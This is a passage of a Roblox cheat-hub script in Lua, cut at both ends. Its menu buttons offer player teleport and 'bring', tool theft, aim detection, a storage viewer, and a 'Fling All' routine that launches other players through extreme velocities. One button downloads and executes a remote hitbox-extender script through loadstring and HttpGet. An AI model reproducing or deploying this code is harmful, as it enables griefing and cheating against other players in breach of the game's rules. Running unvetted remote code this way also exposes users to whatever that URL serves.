-- Warning Label (Top Center)
local WarningLabel = Instance.new("TextLabel", ScreenGui)
WarningLabel.Size = UDim2.new(1, 0, 0, 30)
WarningLabel.Position = UDim2.new(0, 0, 0, 10)
WarningLabel.BackgroundTransparency = 1
WarningLabel.TextColor3 = Color3.fromRGB(0,0,0)
WarningLabel.TextStrokeTransparency = 0
WarningLabel.Font = Enum.Font.Roboto
WarningLabel.TextSize = 20
WarningLabel.Text = ""
WarningLabel.Visible = false

-- Toggle Button
local ToggleButton = Instance.new("TextButton", Frame)
ToggleButton.Size = UDim2.new(1, 0, 0, 25)
ToggleButton.Position = UDim2.new(0, 0, 1, -25)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
ToggleButton.Font = Enum.Font.Roboto
ToggleButton.TextSize = 14
ToggleButton.Text = "Detection: ON"

-- Function to check aim
local function isAimingAtHead(attacker)
    if not attacker.Character or not attacker.Character:FindFirstChild("Head") then return false end
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Head") then return false end

    local attackerHead = attacker.Character.Head
    local localHead = LocalPlayer.Character.Head

    local lookDir = attackerHead.CFrame.LookVector
    local dirToOurHead = (localHead.Position - attackerHead.Position).Unit

    local dot = lookDir:Dot(dirToOurHead)
    local angle = math.deg(math.acos(dot))

    return angle <= FOV_THRESHOLD
end

-- Update loop
task.spawn(function()
    while true do
        task.wait(UPDATE_INTERVAL)

        if not detectionEnabled then
            PlayerList.Text = "Detection OFF"
            WarningLabel.Visible = false
            Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
            continue
        end

        local threats = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if isAimingAtHead(plr) then
                    table.insert(threats, plr.Name)
                end
            end
        end

        if #threats > 0 then
            Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
            PlayerList.Text = "⚠ Threats:\n" .. table.concat(threats, "\n")
            WarningLabel.Text = "⚠ WARNING: " .. table.concat(threats, ", ") .. " aiming at you!"
            WarningLabel.Visible = true
        else
            Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
            PlayerList.Text = "No threats detected."
            WarningLabel.Visible = false
        end
    end
end)

-- Toggle function
local function toggleDetection()
    detectionEnabled = not detectionEnabled
    ToggleButton.Text = detectionEnabled and "Detection: ON" or "Detection: OFF"
end

-- Button Click
ToggleButton.MouseButton1Click:Connect(toggleDetection)

-- Hotkey (G)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.G then
        toggleDetection()
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PLAYER LIST TP (MONSY)", function()
	-- PUBLIC ENEMY - Player Viewer (LocalScript sa StarterGui)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- GUI parent
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Toggle visibility keybind (K)
UserInputService.InputBegan:Connect(function(input, isProcessed)
	if not isProcessed and input.KeyCode == Enum.KeyCode.K then
		screenGui.Enabled = not screenGui.Enabled
	end
end)

-- Main draggable frame
local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 520, 0, 360)
mainFrame.Position = UDim2.new(0.5, -260, 0.5, -180)
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.BorderSizePixel = 0

-- Title bar
local titleBar = Instance.new("TextLabel", mainFrame)
titleBar.Size = UDim2.new(1, 0, 0, 36)
titleBar.BackgroundColor3 = Color3.fromRGB(255,255,255)
titleBar.Text = "PUBLIC ENEMY"
titleBar.Font = Enum.Font.Roboto
titleBar.TextSize = 22
titleBar.TextColor3 = Color3.fromRGB(0,0,0)
titleBar.BorderSizePixel = 0

-- Left: player list (scrolling)
local leftWidth = 0.34
local scroll = Instance.new("ScrollingFrame", mainFrame)
scroll.Name = ""
scroll.Position = UDim2.new(0, 0, 0, 36)
scroll.Size = UDim2.new(leftWidth, 0, 1, -36)
scroll.BackgroundColor3 = Color3.fromRGB(255,255,255)
scroll.ScrollBarThickness = 6
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.BorderSizePixel = 0

local listLayout = Instance.new("UIListLayout", scroll)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 4)

-- Right: info + buttons
local right = Instance.new("Frame", mainFrame)
right.Position = UDim2.new(leftWidth, 0, 0, 36)
right.Size = UDim2.new(1 - leftWidth, 0, 1, -36)
right.BackgroundColor3 = Color3.fromRGB(255,255,255)
right.BorderSizePixel = 0

-- Center container for Name/Health
local infoContainer = Instance.new("Frame", right)
infoContainer.Size = UDim2.new(1, 0, 0.55, 0)
infoContainer.Position = UDim2.new(0, 0, 0, 8)
infoContainer.BackgroundTransparency = 1

local nameLabel = Instance.new("TextLabel", infoContainer)
nameLabel.Size = UDim2.new(1, -20, 0, 36)
nameLabel.Position = UDim2.new(0, 10, 0, 10)
nameLabel.BackgroundTransparency = 1
nameLabel.Font = Enum.Font.Roboto
nameLabel.TextSize = 22
nameLabel.TextColor3 = Color3.fromRGB(0,0,0)
nameLabel.Text = "Name: None"
nameLabel.TextXAlignment = Enum.TextXAlignment.Center

local healthLabel = Instance.new("TextLabel", infoContainer)
healthLabel.Size = UDim2.new(1, -20, 0, 26)
healthLabel.Position = UDim2.new(0, 10, 0, 60)
healthLabel.BackgroundTransparency = 1
healthLabel.Font = Enum.Font.Roboto
healthLabel.TextSize = 18
healthLabel.TextColor3 = Color3.fromRGB(0,0,0)
healthLabel.Text = "Health: N/A"
healthLabel.TextXAlignment = Enum.TextXAlignment.Center

-- Buttons container
local buttonContainer = Instance.new("Frame", right)
buttonContainer.Size = UDim2.new(1, 0, 0.35, 0)
buttonContainer.Position = UDim2.new(0, 0, 0.6, 0)
buttonContainer.BackgroundTransparency = 1

local padding = Instance.new("UIPadding", buttonContainer)
padding.PaddingTop = UDim.new(0, 5)
padding.PaddingBottom = UDim.new(0, 5)

local btnLayout = Instance.new("UIListLayout", buttonContainer)
btnLayout.SortOrder = Enum.SortOrder.LayoutOrder
btnLayout.Padding = UDim.new(0, 8)
btnLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
btnLayout.VerticalAlignment = Enum.VerticalAlignment.Top

-- Button creator
local function createButton(label)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0.85, 0, 0.22, 0)
	b.AnchorPoint = Vector2.new(0.5, 0)
	b.BackgroundColor3 = Color3.fromRGB(255,255,255)
	b.Font = Enum.Font.Roboto
	b.TextSize = 18
	b.Text = label
	b.TextColor3 = Color3.fromRGB(0,0,0)
	b.AutoButtonColor = true
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = b
	b.Parent = buttonContainer
	return b
end

local viewButton = createButton("View Player")
local tpButton = createButton("Teleport to Player")
local bringButton = createButton("Bring Player") -- bagong button
local friendButton = createButton("Add Friend")

-- State
local selectedPlayer = nil
local isViewing = false
local isBringing = false
local originalCameraSubject = Camera.CameraSubject
local bringConnection

-- Helper: safely revert camera
local function revertCamera()
	if originalCameraSubject and typeof(originalCameraSubject) == "Instance" and originalCameraSubject.Parent then
		Camera.CameraSubject = originalCameraSubject
	else
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
			Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		end
	end
	Camera.CameraType = Enum.CameraType.Custom
	isViewing = false
	viewButton.Text = "View Player"
end

-- Build player list
local function refreshPlayerList()
	for _, c in ipairs(scroll:GetChildren()) do
		if c:IsA("TextButton") then c:Destroy() end
	end
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			local btn = Instance.new("TextButton")
			btn.Size = UDim2.new(1, -8, 0, 28)
			btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
			btn.TextColor3 = Color3.fromRGB(0,0,0)
			btn.Font = Enum.Font.Roboto
			btn.TextSize = 16
			btn.AutoButtonColor = true
			btn.Text = plr.Name
			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0, 4)
			corner.Parent = btn
			btn.Parent = scroll
			btn.MouseButton1Click:Connect(function()
				selectedPlayer = plr
				nameLabel.Text = "Name: " .. plr.Name
				local humanoid = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					healthLabel.Text = "Health: " .. math.floor(humanoid.Health)
				else
					healthLabel.Text = "Health: N/A"
				end
				if isViewing then revertCamera() end
			end)
		end
	end
end

-- Button behaviors
viewButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	local char = selectedPlayer.Character
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end
	if not isViewing then
		originalCameraSubject = Camera.CameraSubject
		Camera.CameraSubject = humanoid
		Camera.CameraType = Enum.CameraType.Custom
		isViewing = true
		viewButton.Text = "Unview Player"
	else
		revertCamera()
	end
end)

tpButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	local targetHRP = selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart")
	local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if targetHRP and myHRP then
		myHRP.CFrame = targetHRP.CFrame + Vector3.new(2, 0.5, 0)
	end
end)

bringButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	if not isBringing then
		isBringing = true
		bringButton.Text = "Unbring Player"
		bringConnection = RunService.RenderStepped:Connect(function()
			local targetChar = selectedPlayer.Character
			local myChar = LocalPlayer.Character
			if targetChar and myChar then
				local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
				local myHRP = myChar:FindFirstChild("HumanoidRootPart")
				if targetHRP and myHRP then
					targetHRP.CFrame = myHRP.CFrame + Vector3.new(2, 0, 0)
				end
			end
		end)
	else
		isBringing = false
		bringButton.Text = "Bring Player"
		if bringConnection then bringConnection:Disconnect() end
	end
end)

friendButton.MouseButton1Click:Connect(function()
	if selectedPlayer then
		LocalPlayer:RequestFriendship(selectedPlayer)
	end
end)

-- Keep health label updated
RunService.Heartbeat:Connect(function()
	if selectedPlayer then
		local humanoid = selectedPlayer.Character and selectedPlayer.Character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			healthLabel.Text = "Health: " .. math.floor(humanoid.Health)
		else
			healthLabel.Text = "Health: N/A"
		end
	end
end)

Players.PlayerRemoving:Connect(function(plr)
	if plr == selectedPlayer then
		selectedPlayer = nil
		nameLabel.Text = "Name: None"
		healthLabel.Text = "Health: N/A"
		if isViewing then revertCamera() end
	end
	refreshPlayerList()
end)

Players.PlayerAdded:Connect(function()
	refreshPlayerList()
end)

refreshPlayerList()
end)

addMainMenuButton("TPUNANCHORED TO PLAYER (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local Debris = game:GetService("Debris")

--// GUI Setup
local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
ScreenGui.Name = ""
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 230)
Frame.Position = UDim2.new(0, 20, 0.5, -115)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Instance.new("UICorner", Frame)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "PUBLIC ENEMY UNANCHORED TP"
Title.TextColor3 = Color3.new(0,0,0)
Title.Font = Enum.Font.Roboto
Title.TextSize = 14
Title.BackgroundTransparency = 1

-- Username Input
local UsernameBox = Instance.new("TextBox", Frame)
UsernameBox.PlaceholderText = "Enter Player Username"
UsernameBox.Size = UDim2.new(1, -20, 0, 30)
UsernameBox.Position = UDim2.new(0, 10, 0, 40)
UsernameBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
UsernameBox.TextColor3 = Color3.new(0,0,0)
UsernameBox.Font = Enum.Font.Roboto
UsernameBox.TextSize = 14
UsernameBox.Text = ""
Instance.new("UICorner", UsernameBox)

-- Filter Label
local FilterLabel = Instance.new("TextLabel", Frame)
FilterLabel.Size = UDim2.new(1, -20, 0, 20)
FilterLabel.Position = UDim2.new(0, 10, 0, 80)
FilterLabel.Text = "Tool Filter:"
FilterLabel.TextColor3 = Color3.new(0,0,0)
FilterLabel.Font = Enum.Font.Roboto
FilterLabel.TextSize = 13
FilterLabel.BackgroundTransparency = 1

-- Filter Dropdown
local FilterDropdown = Instance.new("TextButton", Frame)
FilterDropdown.Size = UDim2.new(1, -20, 0, 30)
FilterDropdown.Position = UDim2.new(0, 10, 0, 100)
FilterDropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
FilterDropdown.Text = "All Tools"
FilterDropdown.TextColor3 = Color3.new(0,0,0)
FilterDropdown.Font = Enum.Font.Roboto
FilterDropdown.TextSize = 13
Instance.new("UICorner", FilterDropdown)

-- Cycle filter options
local filterModes = {"All Tools", "Guns Only", "Melee Only"}
local filterIndex = 1

FilterDropdown.MouseButton1Click:Connect(function()
	filterIndex = filterIndex + 1
	if filterIndex > #filterModes then
		filterIndex = 1
	end
	FilterDropdown.Text = filterModes[filterIndex]
end)

-- Filter logic
local function isToolAllowed(tool)
	local name = tool.Name:lower()

	if filterModes[filterIndex] == "All Tools" then
		return true
	elseif filterModes[filterIndex] == "Guns Only" then
		return name:find("gun") or name:find("pistol") or name:find("UZI") or name:find("silenced pistol") or name:find("desert deagle") or name:find("glock-17") or name:find("glock-19")
	elseif filterModes[filterIndex] == "Melee Only" then
		return name:find("knife") or name:find("bat") or name:find("knife") or name:find("blade") or name:find("crowbar")
	end

	return false
end

-- Main TP (tools fly to player)
local function teleportToolsToPlayer(targetPlayer)
	if not targetPlayer then
		warn("No player specified or player not found.")
		return
	end

	local root = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not root then
		warn("Target player has no HRP")
		return
	end

	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("Tool") or (v:IsA("BasePart") and v.Name == "Handle") then
			local tool = v:IsA("Tool") and v or v:FindFirstAncestorWhichIsA("Tool")
			if tool and tool:IsDescendantOf(Workspace) and not tool:FindFirstChildOfClass("Humanoid") then
				local handle = tool:FindFirstChild("Handle")
				if handle and not handle.Anchored and isToolAllowed(tool) then
					if handle:FindFirstChild("BodyVelocity") then handle.BodyVelocity:Destroy() end
					local bv = Instance.new("BodyVelocity")
					bv.Velocity = (root.Position - handle.Position).Unit * 100
					bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
					bv.P = 10000
					bv.Parent = handle
					Debris:AddItem(bv, 0.5)
				end
			end
		end
	end
end

-- Grab Tools to Backpack
local function grabToolsToBackpack()
	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("Tool") and v:FindFirstChild("Handle") and not v.Handle.Anchored and isToolAllowed(v) then
			v.Parent = LocalPlayer.Backpack
		end
	end
end

-- TP Button
local TPButton = Instance.new("TextButton", Frame)
TPButton.Size = UDim2.new(1, -20, 0, 30)
TPButton.Position = UDim2.new(0, 10, 1, -75)
TPButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
TPButton.Text = "Teleport Unanchored To Player"
TPButton.TextColor3 = Color3.new(0,0,0)
TPButton.Font = Enum.Font.Roboto
TPButton.TextSize = 13
Instance.new("UICorner", TPButton)

-- Grab Button
local GrabButton = Instance.new("TextButton", Frame)
GrabButton.Size = UDim2.new(1, -20, 0, 30)
GrabButton.Position = UDim2.new(0, 10, 1, -40)
GrabButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
GrabButton.Text = "Grab Tools"
GrabButton.TextColor3 = Color3.new(0,0,0)
GrabButton.Font = Enum.Font.Roboto
GrabButton.TextSize = 13
Instance.new("UICorner", GrabButton)

-- Button Events
TPButton.MouseButton1Click:Connect(function()
	local inputName = UsernameBox.Text
	if inputName == "" then
		warn("No username entered.")
		return
	end

	local targetPlayer = Players:FindFirstChild(inputName)
	if not targetPlayer then
		warn("Player not found: " .. inputName)
		return
	end

	teleportToolsToPlayer(targetPlayer)
end)

GrabButton.MouseButton1Click:Connect(grabToolsToBackpack)
end)

addMainMenuButton("FLING ALL (MONSY)", function()
	game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Script Executed";
    Text = "Fling All";
    Duration = 6;
})
 
local Targets = {"All"} -- "All", "Target Name", "arian_was_here"
 
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
 
local AllBool = false
 
local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end
 
local Message = function(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end
 
local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart
 
    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle
 
    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end
 
    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit and not AllBool then
            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
 
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
 
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0
 
            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
 
        workspace.FallenPartsDestroyHeight = 0/0
 
        local BV = Instance.new("BodyVelocity")
        BV.Name = ""
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
 
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
 
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        else
            return Message("Error Occurred", "Target is missing everything", 5)
        end
 
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
 
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message("Error Ocurrido", "El Script A Fallado", 5)
    end
end
 
if not Welcome then Message("By Augus X", "", 6) end
getgenv().Welcome = true
if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
 
if AllBool then
    for _,x in next, Players:GetPlayers() do
        SkidFling(x)
    end
end
 
for _,x in next, Targets do
    if GetPlayer(x) and GetPlayer(x) ~= Player then
        if GetPlayer(x).UserId ~= 2924145477 then
            local TPlayer = GetPlayer(x)
            if TPlayer then
                SkidFling(TPlayer)
            end
        else
            Message("ERROR AL ASER FLING", "", 8)
        end
    elseif not GetPlayer(x) and not AllBool then
        Message("ERROR OCURRIDO", "NO SE LE ISO FLING", 8)
    end
end
end)

addMainMenuButton("HITBOX EXTENDER (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/LisSploit/HitBoxExtender/main/Universal",true))()
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["ROLEPLAY MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE SYSTEM VIEWER FOR ALL CITY (MONSY)", function()
    -- LocalScript: StorageSystem Tools Viewer (All Black + Copyable Tools + Hide with O)
-- Place in StarterPlayerScripts or StarterGui

--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Find StorageSystem
local storageSystem = ReplicatedStorage:FindFirstChild("StorageSystem")
if not storageSystem then
    warn("❌ 'StorageSystem' not found in ReplicatedStorage.")
    return
end

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 340)
frame.Position = UDim2.new(0.5, -200, 0.25, 0)
frame.Active = true
frame.Draggable = true
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.AnchorPoint = Vector2.new(0.5, 0)

-- Rounded corners
local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 12)

-- subtle shadow frame
local shadow = Instance.new("Frame", frame)
shadow.Size = UDim2.new(1, 0, 1, 0)
shadow.Position = UDim2.new(0, 4, 0, 4)
shadow.BackgroundColor3 = Color3.fromRGB(10,10,10)
shadow.ZIndex = -1
shadow.BorderSizePixel = 0

-- Title bar
local titleBar = Instance.new("Frame", frame)
titleBar.Size = UDim2.new(1, 0, 0, 35)
titleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
titleBar.BorderSizePixel = 0
local titleCorner = Instance.new("UICorner", titleBar)
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Name = ""

local title = Instance.new("TextLabel", titleBar)
title.Size = UDim2.new(1, 0, 1, 0)
title.BackgroundTransparency = 1
title.Text = "StorageSystem Viewer"
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(0,0,0)

local info = Instance.new("TextLabel", frame)
info.Size = UDim2.new(1, -10, 0, 20)
info.Position = UDim2.new(0, 5, 0, 40)
info.BackgroundTransparency = 1
info.Text = "   Click a tool to copy its name  |  Press [O] to hide/show"
info.Font = Enum.Font.Roboto
info.TextSize = 13
info.TextColor3 = Color3.fromRGB(180, 180, 180)
info.TextXAlignment = Enum.TextXAlignment.Left

local scrolling = Instance.new("ScrollingFrame", frame)
scrolling.Size = UDim2.new(1, -20, 1, -70)
scrolling.Position = UDim2.new(0, 10, 0, 65)
scrolling.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
scrolling.BorderSizePixel = 0
scrolling.ScrollBarThickness = 6
scrolling.CanvasSize = UDim2.new(0, 0, 0, 0)

local layout = Instance.new("UIListLayout", scrolling)
layout.Padding = UDim.new(0, 6)
layout.SortOrder = Enum.SortOrder.LayoutOrder

--// Helper Functions
local function clearList()
    for _, child in ipairs(scrolling:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
end

local function copyToClipboard(text)
    if setclipboard then
        setclipboard(text)
    elseif writeclipboard then
        writeclipboard(text)
    else
        warn("Clipboard copy not supported in this environment.")
    end
end

local function addToolLine(tool)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -8, 0, 26)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 14
    btn.Text = " " .. tool.Name
    btn.AutoButtonColor = false
    btn.Parent = scrolling

    local corner = Instance.new("UICorner", btn)
    corner.CornerRadius = UDim.new(0, 6)

    -- Hover effect
    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    end)

    -- Click to copy
    btn.MouseButton1Click:Connect(function()
        copyToClipboard(tool.Name)
